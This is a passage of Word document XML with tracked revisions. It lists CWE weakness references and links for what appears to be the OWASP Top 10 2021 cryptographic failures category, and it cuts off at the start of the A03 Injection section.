      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-</w:t>
      </w:r>
      <w:del w:id="1028" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>359: Exposure of Private Information - Privacy Violation</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1029" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">328: Reversible One-Way </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Hash</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/</w:t>
      </w:r>
      <w:del w:id="1030" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>359</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1031" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>328</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.html)</w:t>
      </w:r>
      <w:ins w:id="1032" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="24112F27" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1033" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1034" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-329: Not Using a Random IV with CBC </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Mode](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/329.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="424AB3D9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1035" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1036" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-330: Use of Insufficiently Random </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Values](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/330.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="46E26D04" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1037" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1038" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-331: Insufficient </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Entropy](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/331.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="777CFC7B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1039" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1040" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Generator(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">PRNG)](https://cwe.mitre.org/data/definitions/335.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10EEE635" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1041" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1042" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-336: Same Seed in Pseudo-Random Number Generator (PRNG</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https://cwe.mitre.org/data/definitions/336.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38024BE8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1043" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1044" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG</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https://cwe.mitre.org/data/definitions/337.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4B26D627" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1045" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1046" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-338: Use of Cryptographically Weak Pseudo-Random Number </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Generator(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">PRNG)](https://cwe.mitre.org/data/definitions/338.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2BF26BF6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1047" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1048" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-340: Generation of Predictable Numbers or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Identifiers](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/340.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E249563" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1049" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1050" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-347: Improper Verification of Cryptographic </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Signature](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/347.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2C83A25A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1051" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1052" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-523: Unprotected Transport of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Credentials](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/523.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="50F810B0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1053" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1054" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-720: OWASP Top Ten 2007 Category A9 - Insecure </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Communications](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/720.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57A52067" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1055" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1056" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-757: Selection of Less-Secure Algorithm During </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Negotiation(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">'Algorithm Downgrade')](https://cwe.mitre.org/data/definitions/757.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="74D901E8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1057" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1058" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-759: Use of a One-Way Hash without a </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Salt](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/759.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="442B101A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1059" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1060" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-760: Use of a One-Way Hash with a Predictable </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Salt](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/760.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="431581CC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1061" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1062" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">- [CWE-780: Use of RSA Algorithm without </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>OAEP](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/780.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B214C79" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1063" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1064" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-818: Insufficient Transport Layer </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Protection](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/818.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="377F7DDF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1065" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1066" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-916: Use of Password Hash With Insufficient Computational </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Effort](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/916.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="310CAB87" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1D39E0"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52422C6D"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"https://owasp.org/Top10/A03_2021-Injection/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAF3A92" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A03:2021 – Injection"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1066DF3D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
